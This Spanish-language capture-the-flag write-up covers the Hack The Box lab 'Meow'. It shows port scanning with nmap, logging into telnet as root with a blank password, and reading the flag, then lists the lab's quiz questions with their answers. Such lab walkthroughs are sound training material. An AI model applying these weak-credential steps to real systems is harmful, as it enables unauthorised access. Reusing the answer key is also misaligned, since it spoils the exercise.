[[Telnet]]
[[Credenciales débiles]]
[[Cofiguración insegura]]

IP atacante: `10.10.16.133`
IP victima:  `10.129.6.240`

`$sudo nmap -p- -Pn -sS -n --min-rate 5000 10.129.6.240`
```java
PORT   STATE SERVICE
23/tcp open  telnet
```

Telnet es un popular protocolo de red que le permite conectarse virtualmente a un ordenador remoto. [Es un protocolo antiguo desarrollado en 1969.](https://geekflare.com/es/telnet-commands-to-troubleshoot-connection-issues/)

`$sudo nmap -p23 -sSCV -v 10.129.6.240`
```java
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPnc-vn E: cpe:/o:linux:linux_kernel

```

Nos conectamos directamente al servidor en el puerto 23 sin esperar una respuesta del servidor `-n`.
```java
$telnet 10.129.6.240 23
Trying 10.129.6.240...
Connected to 10.129.6.240.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login:
```

`Meow login: root`
```java
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
...
root@Meow:~# 

```

`# cat flag.txt`
```java
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
```
#### Tarea 1
¿Qué significa el acrónimo VM?  *Virtual Machine*
#### Tarea 2
¿Qué herramienta usamos para interactuar con el sistema operativo y emitir comandos a través de la línea de comandos, como la que inicia nuestra conexión VPN?   *terminal*
#### Tarea 3
¿Qué servicio utilizamos para configurar nuestra conexión VPN en HTB Labs?   *openvpn*
#### Tarea 4
¿Qué herramienta utilizamos para probar nuestra conexión con el objetivo con una solicitud de eco ICMP?   *ping*
#### Tarea 5
¿Cuál es el nombre de la herramienta más común para encontrar puertos abiertos en un objetivo?   *nmap*
#### Tarea 6
¿Qué servicio identificamos en el puerto 23/tcp durante nuestros escaneos?   *telnet*

#### Tarea 7
¿Qué nombre de usuario puede iniciar sesión en el destino a través de telnet con una contraseña en blanco?   *root*







